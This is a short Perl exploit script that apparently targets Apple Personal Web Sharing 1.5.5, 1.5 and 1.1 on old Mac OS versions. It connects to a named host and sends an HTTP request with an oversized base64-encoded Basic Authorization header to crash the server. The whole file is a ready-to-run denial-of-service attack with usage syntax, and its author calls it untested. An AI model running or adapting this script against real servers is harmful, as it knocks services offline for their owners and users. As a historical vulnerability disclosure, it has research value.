#!/usr/bin/perl

# Exploit code for Denial-of-Service attack affecting Apple Personal
# Web Sharing versions 1.5.5, 1.5 & 1.1 (MacOS 9.0, 8.1, 8.0) as
# discovered by Jass Seljamaa <jass@email.isp.ee>.

# Code written by Wizdumb, coz I wuz b0red at work. And not tested ;-P

require 5.002;

use MIME::Base64;
use IO::Socket;

$host = shift || die "Syntax: applebite.pl <hostname> [protected file] [port]";
($file, $port) = ((shift || '/'), (shift || 80));

$base64 = encode_base64('wizdumb:' . ("a" x 350));

$socket = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port,
				Proto => "tcp", Type => SOCK_STREAM)
|| die "Couldnt connect to $host:$port : $@\n";

print $socket "GET $file HTTP/1.0\nAuthorization: Basic $base64\n\n";
@junk = <$socket>;
close($socket);
